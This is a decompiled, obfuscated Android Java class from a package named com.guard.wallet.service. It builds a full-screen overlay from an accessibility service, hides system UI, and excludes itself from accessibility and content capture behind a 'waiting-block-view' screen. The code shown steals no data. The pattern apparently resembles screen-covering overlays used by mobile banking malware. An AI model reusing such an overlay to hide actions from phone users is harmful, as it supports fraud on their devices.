package e0;

import a1.q;
import android.graphics.drawable.Drawable;
import android.os.Build.VERSION;
import android.view.View;
import android.widget.LinearLayout;
import com.guard.wallet.service.MyAccessibilityService;
import java.lang.ref.WeakReference;
import java.util.Objects;

public final class g extends LinearLayout {
   public WeakReference a;

   public g(MyAccessibilityService var1, String var2, Drawable var3) {
      super(var1);
      boolean var4 = true;
      this.setOrientation(1);
      this.setGravity(17);
      this.setSystemUiVisibility(4);
      this.setImportantForAccessibility(2);
      if (VERSION.SDK_INT >= 30) {
         this.setImportantForContentCapture(2);
      }

      if (var3 != null) {
         this.setBackground(var3);
      } else {
         var4 = false;
      }

      if (!var4) {
         this.setBackgroundColor(-16777216);
      }

      this.getViewTreeObserver().addOnGlobalLayoutListener(new h(this));
      if (!q.B(var2)) {
         i var5 = new i(var1, var2);
         var5.setTag("waiting-block-view");
         this.addView(var5, 0);
         this.a = new WeakReference<>(var5);
      }
   }

   public final void onLayout(boolean var1, int var2, int var3, int var4, int var5) {
      int var7 = this.getChildCount();
      if (var7 > 0) {
         for (int var6 = 0; var6 < var7; var6++) {
            View var8 = this.getChildAt(var6);
            if (Objects.equals(var8.getTag(), "waiting-block-view")) {
               var8.layout(var2, var3, var4, var5);
            }
         }
      }
   }
}
